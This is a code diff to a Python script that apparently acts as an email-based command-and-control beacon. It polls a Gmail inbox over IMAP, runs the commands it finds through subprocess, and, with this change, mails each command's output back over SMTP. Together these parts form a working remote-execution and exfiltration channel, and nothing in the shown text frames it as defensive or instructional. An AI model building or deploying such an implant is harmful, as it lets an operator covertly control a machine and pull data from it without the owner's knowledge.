@@ -2,12 +2,14 @@ import email
 import time
 import subprocess
 import imaplib
+import smtplib
+from email.mime.text import MIMEText
 import os
 from dotenv import load_dotenv
 
 load_dotenv()
 IMAP_SERVER = 'imap.gmail.com'
-
+SMTP_SERVER = 'smtp.gmail.com'
 EMAIL = os.getenv("EMAIL")
 PASSWORD = os.getenv("PASSWORD")
 
@@ -46,6 +48,18 @@ def parse_and_execute(raw_email):
 
 def run_command(command):
     output = subprocess.getoutput(command)
-    print(f"Executed: {command}\nOutput:\n{output}")
+    send_response(command, output)
+
+def send_response(command, output):
+    body = f"Command: {command}\n\nOutput:\n{output}"
+    msg = MIMEText(body)
+    msg['Subject'] = 'ResponseSubject'
+    msg['From'] = EMAIL
+    msg['To'] = EMAIL
+
+    smtp = smtplib.SMTP_SSL(SMTP_SERVER, 465)
+    smtp.login(EMAIL, PASSWORD)
+    smtp.sendmail(EMAIL, EMAIL, msg.as_string())
+    smtp.quit()
 
 beacon()
